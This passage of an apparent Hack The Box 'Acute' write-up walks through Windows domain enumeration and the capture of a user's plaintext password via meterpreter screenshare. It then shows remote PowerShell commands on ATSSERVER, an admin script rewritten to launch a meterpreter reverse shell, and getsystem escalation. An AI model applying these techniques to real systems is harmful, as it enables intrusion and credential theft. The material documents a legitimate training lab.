</span><span class="n">TMP</span><span class="w">                            </span><span class="nx">C:\Users\edavies\AppData\Local\Temp</span><span class="w">                                                     
</span><span class="n">USERDNSDOMAIN</span><span class="w">                  </span><span class="nx">ACUTE.LOCAL</span><span class="w">                                                                             
</span><span class="n">USERDOMAIN</span><span class="w">                     </span><span class="nx">ACUTE</span><span class="w">                                                                                   
</span><span class="n">USERDOMAIN_ROAMINGPROFILE</span><span class="w">      </span><span class="nx">ACUTE</span><span class="w">                                                                                   
</span><span class="n">USERNAME</span><span class="w">                       </span><span class="nx">edavies</span><span class="w">                                                                                 
</span><span class="n">USERPROFILE</span><span class="w">                    </span><span class="nx">C:\Users\edavies</span><span class="w">                                                                        
</span><span class="n">windir</span><span class="w">                         </span><span class="nx">C:\Windows</span><span class="w">                                                                              
</span></pre></table></code></div></div><p>I began my enumeration of the system by checking the PowerShell script execution state (Restricted) and the user’s environment variables. The logon server of <code class="language-plaintext highlighter-rouge">\\ATSSERVER</code> was interesting and could come in handy later.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>PS C:\Users\edavies\Documents&gt; whoami /all

USER INFORMATION
----------------
User Name     SID                                           
============= ==============================================

acute\edavies S-1-5-21-1786406921-1914792807-2072761762-1106

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                    
========================================== ================ ============ ==================================================

Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192    

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======

SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.
Kerberos support for Dynamic Access Control on this device has been disabled.
</pre></table></code></div></div><p>The user <code class="language-plaintext highlighter-rouge">edavies</code> was a member of the Remote Management Users group.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>PS C:\Users\edavies&gt; Get-LocalUser | Format-Table Name,Enabled,LastLogon,SID

Name               Enabled LastLogon              SID                                           
----               ------- ---------              ---                                           

Administrator        False 11/18/2020 11:43:09 PM S-1-5-21-2560123600-3246320471-2688489995-500 
DefaultAccount       False                        S-1-5-21-2560123600-3246320471-2688489995-503 
Guest                False                        S-1-5-21-2560123600-3246320471-2688489995-501 
Natasha               True 12/21/2021 12:39:13 PM S-1-5-21-2560123600-3246320471-2688489995-1001
WDAGUtilityAccount   False                        S-1-5-21-2560123600-3246320471-2688489995-504 
</pre></table></code></div></div><p>I checked to see if there were any other users on the machine, and found that there was another user <code class="language-plaintext highlighter-rouge">Natasha</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>PS C:\Users\edavies&gt; Get-ChildItem C:\Users -Force | select Name

Name               
----               

administrator.ACUTE
All Users          
Default            
Default User       
edavies            
jmorgan            
Natasha            
Public             
desktop.ini        
</pre></table></code></div></div><p>After listing out the folders in the <code class="language-plaintext highlighter-rouge">C:\Users</code> directory I found even more usernames. There was also a user <code class="language-plaintext highlighter-rouge">jmorgan</code> who had a user folder, and the default administrator account had been renamed <code class="language-plaintext highlighter-rouge">administrator.ACUTE</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>PS C:\Users\edavies&gt; net user Natasha

User name                    Natasha
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never
Password last set            21/12/2021 10:23:01
Password expires             Never
Password changeable          22/12/2021 10:23:01
Password required            No
User may change password     Yes
Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   21/12/2021 13:39:13
Logon hours allowed          All
Local Group Memberships      
Global Group memberships     *None                 

The command completed successfully.
</pre></table></code></div></div><p>I couldnt find much information about either user. <code class="language-plaintext highlighter-rouge">jmorgan</code> had never logged into this machine, so I couldn’t pull anything about them.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>PS C:\Users\edavies&gt; net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------

ACUTE\Domain Admins
ACUTE\jmorgan
Administrator

The command completed successfully.
</pre></table></code></div></div><p>However, I was able to find out that <code class="language-plaintext highlighter-rouge">jmorgan</code> was an administrator on this machine by checking the group’s membership.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>PS C:\Users\edavies&gt; Get-computerinfo

WindowsBuildLabEx                                       : 19041.1.amd64fre.vb_release.191206-1406
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : Education
WindowsInstallationType                                 : Client
WindowsInstallDateFromRegistry                          : 11/18/2021 10:57:05 PM
WindowsProductId                                        : 00328-10000-00001-AA030
WindowsProductName                                      : Windows 10 Education
WindowsRegisteredOrganization                           : 
WindowsRegisteredOwner                                  : Natasha
WindowsSystemRoot                                       : C:\Windows
WindowsVersion                                          : 2009
</pre></table></code></div></div><p>It looked like the computer was owned by <code class="language-plaintext highlighter-rouge">Natasha</code>, and was Windows 10 Education 20-09.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre>PS C:\Users\edavies&gt; Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' 

    Directory: C:\Program Files

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 

d-----         12/7/2019   9:31 AM                Common Files                                                         
d-----        11/23/2021   8:30 AM                Internet Explorer                                                    
d-----         12/5/2021  12:13 AM                Microsoft Update Health Tools                                        
d-----         12/7/2019   9:14 AM                ModifiableWindowsApps                                                
d-----         12/6/2021  11:06 AM                PackageManagement                                                    
d-----        11/22/2021   8:45 PM                Windows Defender                                                     
d-----         1/12/2022   7:08 PM                Windows Defender Advanced Threat Protection                          
d-----        11/22/2021   8:21 PM                Windows Mail                                                         
d-----        11/22/2021   8:21 PM                Windows Media Player                                                 
d-----         12/7/2019   2:47 PM                Windows Multimedia Platform                                          
d-----         12/7/2019   2:44 PM                Windows NT                                                           
d-----          4/9/2021   2:20 PM                Windows Photo Viewer                                                 
d-----         12/7/2019   2:47 PM                Windows Portable Devices                                             
d-----         12/7/2019   9:31 AM                Windows Security                                                     
d-----         12/6/2021  11:06 AM                WindowsPowerShell                                                    

    Directory: C:\Program Files (x86)

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 

d-----         12/7/2019   9:31 AM                Common Files                                                         
d-----        11/23/2021   8:30 AM                Internet Explorer                                                    
d-----        11/22/2021   3:47 PM                Microsoft                                                            
d-----         12/7/2019   9:31 AM                Microsoft.NET                                                        
d-----          4/9/2021   2:20 PM                Windows Defender                                                     
d-----        11/22/2021   8:21 PM                Windows Mail                                                         
d-----        11/22/2021   8:21 PM                Windows Media Player                                                 
d-----         12/7/2019   2:47 PM                Windows Multimedia Platform                                          
d-----         12/7/2019   2:44 PM                Windows NT                                                           
d-----          4/9/2021   2:20 PM                Windows Photo Viewer                                                 
d-----         12/7/2019   2:47 PM                Windows Portable Devices                                             
d-----         12/7/2019   9:31 AM                WindowsPowerShell                                                    
</pre></table></code></div></div><p>There did not seem to be much in the way of installed software on this machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre><td class="rouge-code"><pre>PS C:\Users\edavies&gt; netstat -nao

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       888
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       748
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       2452
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       568
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       688
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       504
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       624
  TCP    172.16.22.2:139        0.0.0.0:0              LISTENING       4
  TCP    172.16.22.2:5985       172.16.22.1:60300      ESTABLISHED     4
  TCP    172.16.22.2:5985       172.16.22.1:60302      ESTABLISHED     4
  TCP    172.16.22.2:5985       172.16.22.1:60310      TIME_WAIT       0
  TCP    172.16.22.2:5985       172.16.22.1:60311      ESTABLISHED     4
  TCP    172.16.22.2:5985       172.16.22.1:63895      ESTABLISHED     4
  TCP    172.16.22.2:5985       172.16.22.1:63902      ESTABLISHED     4
  TCP    172.16.22.2:5985       172.16.22.1:63929      ESTABLISHED     4
  TCP    172.16.22.2:63840      172.16.22.1:5985       TIME_WAIT       0
  TCP    [::]:135               [::]:0                 LISTENING       888
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:7680              [::]:0                 LISTENING       2452
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       632
  TCP    [::]:49665             [::]:0                 LISTENING       568
  TCP    [::]:49666             [::]:0                 LISTENING       688
  TCP    [::]:49667             [::]:0                 LISTENING       504
  TCP    [::]:49670             [::]:0                 LISTENING       632
  TCP    [::]:49678             [::]:0                 LISTENING       624
  UDP    0.0.0.0:123            *:*                                    1036
  UDP    0.0.0.0:500            *:*                                    504
  UDP    0.0.0.0:4500           *:*                                    504
  UDP    0.0.0.0:5050           *:*                                    748
  UDP    0.0.0.0:5353           *:*                                    4264
  UDP    0.0.0.0:5353           *:*                                    1128
  UDP    0.0.0.0:5353           *:*                                    4264
  UDP    0.0.0.0:5355           *:*                                    1128
  UDP    127.0.0.1:1900         *:*                                    3196
  UDP    127.0.0.1:52089        *:*                                    632
  UDP    127.0.0.1:52097        *:*                                    504
  UDP    127.0.0.1:56063        *:*                                    1544
  UDP    127.0.0.1:59754        *:*                                    3196
  UDP    127.0.0.1:61269        *:*                                    4256
  UDP    127.0.0.1:63321        *:*                                    1128
  UDP    172.16.22.2:137        *:*                                    4
  UDP    172.16.22.2:138        *:*                                    4
  UDP    172.16.22.2:1900       *:*                                    3196
  UDP    172.16.22.2:59753      *:*                                    3196
  UDP    [::]:123               *:*                                    1036
  UDP    [::]:500               *:*                                    504
  UDP    [::]:4500              *:*                                    504
  UDP    [::]:5353              *:*                                    1128
  UDP    [::]:5353              *:*                                    4264
  UDP    [::]:5355              *:*                                    1128
  UDP    [::1]:1900             *:*                                    3196
  UDP    [::1]:59752            *:*                                    3196
  UDP    [fe80::9513:4361:23ec:64fd%14]:1900  *:*                                    3196
  UDP    [fe80::9513:4361:23ec:64fd%14]:59751  *:*                                    3196
</pre></table></code></div></div><p>Netstat showed more ports open on the inside I didnt see before, and also showed active connections to some IPs that looked to possibly be containers of some sort.</p><p>After exploring and enumerating for quite some time I seemed to be stuck. I recieved a tip from another user to check what the user was doing on their Desktop. After spending a few hours wasting time with various ways to take screenshots using PowerShell, the .Net API, and meterpreter, I came to the conclusion that this wasn’t possible due to the way Hack The Box runs the virtual machines. There is no actual Desktop being created so this is why any screenshots taken came out black (if the API even allowed the method to run!).</p><h3 id="meterpreter-screenshare">Meterpreter screenshare</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_10_screenshare.png" alt="The desktop of edavies being streamed using meterpreter" /></p><p>The solution ended up being a meterpreter command I had never used: <code class="language-plaintext highlighter-rouge">screenshare</code>. This created a web live-stream of the user’s desktop (scripted I am sure, as it was on a loop). It showed a command prompt launching PowerShell, then presumably the user typing some commands on the screen. For some reason (CTF moment here…) these commands were not being allowed to be logged to the console host history file (which I had check earlier and was empty).</p><h3 id="finding-user-creds">Finding user creds</h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$passwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"W3_4R3_th3_f0rce."</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"acute\imonks"</span><span class="p">,</span><span class="nv">$passwd</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>I had to quickly take some screenshots of the commands as they went past, as they went away quickly. (If you miss it the first time, the stream is on a loop and you can try again!) I did notice that there was a username <code class="language-plaintext highlighter-rouge">acute\imonks</code> and password <code class="language-plaintext highlighter-rouge">W3_4R3_th3_f0rce.</code> being passed in plaintext. The user first tried entering a PSSession, but after failing typed in the credentials to be used.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/acute_11_screenshare2.png" alt="The desktop of edavies being streamed using meterpreter, part 2" /></p><p>After typing in the credentials to be used, the user tried a few more times to connect to a remote server <code class="language-plaintext highlighter-rouge">ATSSERVER</code>, which I recognized as the logon server. I wanted to try to replicate what the user was doing and see if I could get a remote shell on that system.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>PS C:\Windows\system32&gt; Enter-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Enter-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Enter-PSSession : The term 'Measure-Object' is not recognized as the name of a cmdlet, function, script file, or 
operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try 
again.
At line:1 char:1
+ Enter-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage  ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Measure-Object:String) [Enter-PSSession], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
</pre></table></code></div></div><p>I tried replicating what they were doing, and got the same error. I was not able to create the PSSession to log in. I did some research on the error message, and found a blog post that showed how to manage Windows Server containers using PowerShell. It seemed to indicate that this error was because the server was a container.</p><ul><li>https://petri.com/managing-windows-server-containers-with-powershell-managing-containers/</ul><blockquote><p>If you run Enter-PSSession too soon after starting a container, then you will get the following misleading error: Enter-PSSession : The term ‘Measure-Object’ is not recognized as the name of a cmdlet, function, script file, or operable program.</p></blockquote><blockquote><p>The advantage of Enter-PSSession is that it allows you to get quite a bit of manual work done inside of a container. However, it is an interactive-only approach, and it is not suitable for remote scripting. If you want to run a single command against a container, or if you want to script administrative tasks inside of a container, then you should use Invoke-Command. Invoke-Command allows you to execute a script block against a machine or a container; the example below will send a script block to retrieve the IPv4 address of a container, which we might later use to create NAT rules on a VM host.</p></blockquote><h2 id="enumeration-as-acuteimonks">Enumeration as acute\imonks</h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-computername</span><span class="w"> </span><span class="nx">atsserver</span><span class="w"> </span><span class="nt">-ConfigurationName</span><span class="w"> </span><span class="nx">dc_manage</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="err">$</span><span class="p">(</span><span class="n">ls</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="nx">/Desktop</span><span class="p">)}</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w">
</span></pre></table></code></div></div><p>I had a bit of hard time getting commands to run, but using the information from the blog post and combining it with what the user had been doing I was able to get single commands to run.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-computername</span><span class="w"> </span><span class="nx">atsserver</span><span class="w"> </span><span class="nt">-ConfigurationName</span><span class="w"> </span><span class="nx">dc_manage</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="err">$</span><span class="p">(</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="p">)}</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w">
</span><span class="n">Program</span><span class="w"> </span><span class="s1">'whoami.exe'</span><span class="w"> </span><span class="nx">failed</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run:</span><span class="w"> </span><span class="nx">The</span><span class="w"> </span><span class="nx">term</span><span class="w"> </span><span class="s1">'Out-String'</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">recognized</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">cmdlet</span><span class="p">,</span><span class="w"> </span><span class="nx">function</span><span class="p">,</span><span class="w"> </span><span class="nx">script</span><span class="w"> 
</span><span class="n">file</span><span class="p">,</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">operable</span><span class="w"> </span><span class="nx">program.</span><span class="w"> </span><span class="nx">Check</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">spelling</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">if</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">included</span><span class="p">,</span><span class="w"> </span><span class="nx">verify</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">correct</span><span class="w"> 
</span><span class="n">and</span><span class="w"> </span><span class="nx">try</span><span class="w"> </span><span class="nx">again.At</span><span class="w"> </span><span class="nx">line:1</span><span class="w"> </span><span class="nx">char:3</span><span class="w">
</span><span class="o">+</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="p">)</span><span class="w">
</span><span class="o">+</span><span class="w">   </span><span class="n">~~~~~~~~~~~.</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="nx">CategoryInfo</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">ResourceUnavailable:</span><span class="w"> </span><span class="p">(:)</span><span class="w"> </span><span class="p">[],</span><span class="w"> </span><span class="n">ApplicationFailedException</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="nx">FullyQualifiedErrorId</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">NativeCommandFailed</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="n">PSComputerName</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">atsserver</span><span class="w">
</span></pre></table></code></div></div><p>However, not all commands would run, unfortunately.</p><h3 id="usertxt">User.txt</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>PS C:\Windows\system32&gt; Invoke-Command -computername atsserver -ConfigurationName dc_manage -ScriptBlock {$(ls $env:userprofile/Desktop)} -Credential $cred
Invoke-Command -computername atsserver -ConfigurationName dc_manage -ScriptBlock {$(ls $env:userprofile/Desktop)} -Credential $cred


    Directory: C:\Users\imonks\Desktop


Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    
-ar---        15/07/2022     13:32             34 user.txt                           atsserver                         
-a----        11/01/2022     18:04            602 wm.ps1                             atsserver
</pre></table></code></div></div><p>I started doing basic enumeration, one command at a time, and found two files on the user’s Desktop.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="nx">Invoke-Command</span><span class="w"> </span><span class="nt">-computername</span><span class="w"> </span><span class="nx">atsserver</span><span class="w"> </span><span class="nt">-ConfigurationName</span><span class="w"> </span><span class="nx">dc_manage</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="err">$</span><span class="p">(</span><span class="n">cat</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="nx">/Desktop\user.txt</span><span class="p">)}</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w">
</span><span class="n">e54e8178e5aca9f07aed75672ee6492a</span><span class="w">
</span></pre></table></code></div></div><p>I had the user flag!</p><h3 id="finding-user-creds-1">Finding user creds</h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="nx">Invoke-Command</span><span class="w"> </span><span class="nt">-computername</span><span class="w"> </span><span class="nx">atsserver</span><span class="w"> </span><span class="nt">-ConfigurationName</span><span class="w"> </span><span class="nx">dc_manage</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="err">$</span><span class="p">(</span><span class="n">cat</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="nx">/Desktop\wm.ps1</span><span class="p">)}</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w">

</span><span class="nv">$securepasswd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'</span><span class="w">
</span><span class="nv">$passwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$securepasswd</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w">
</span><span class="nv">$creds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"acute\jmorgan"</span><span class="p">,</span><span class="w"> </span><span class="nv">$passwd</span><span class="p">)</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">Get-Volume</span><span class="p">}</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="n">Acute-PC01</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$creds</span><span class="w">
</span></pre></table></code></div></div><p>The second file <code class="language-plaintext highlighter-rouge">wm.ps1</code>, a PowerShell script, contained a (rediculously long!) password and another username. It looked like this one was running commands from the server back to the <code class="language-plaintext highlighter-rouge">Acute-PC01</code> host. I remembered this user as being an administrator on the original computer, so it looked like a likely lead.</p><h2 id="enumeration-as-acutejmorgan">Enumeration as acute\jmorgan</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>PS C:\utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{((Get-Content "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\test.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred

Windows PowerShell Credential Request: Windows PowerShell credential request
Warning: A script or application on the remote computer ACUTE-PC01 is requesting your credentials. Enter your credentials only if you trust the remote computer and the application or script that is requesting them. 

Enter your credentials.

Enter your user name: acute\imonks
Enter your password: *****************
</pre></table></code></div></div><p>I found that I had read/write access to this file, so I used some commandline kung-fu to replace the command being run in the script by the administrator with my meterpreter reverse shell that I had used before. After entering the credentials for <code class="language-plaintext highlighter-rouge">acute\imonks</code> the script ran.</p><ul><li>https://stackoverflow.com/questions/21391012/modify-the-contents-of-a-file-in-powershell</ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>meterpreter &gt; getsid
Server SID: S-1-5-21-1786406921-1914792807-2072761762-1108
meterpreter &gt; getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

</pre></table></code></div></div><p>Using meterpreter I was able to get the SID of the server and escalate myself to <code class="language-plaintext highlighter-rouge">NT AUTHORITY/SYSTEM</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre><td class="rouge-code"><pre>PS C:\Users\jmorgan\Documents&gt; whoami /all
whoami /all

USER INFORMATION
----------------

User Name     SID                                           
============= ==============================================
acute\jmorgan S-1-5-21-1786406921-1914792807-2072761762-1108


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                                     
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             
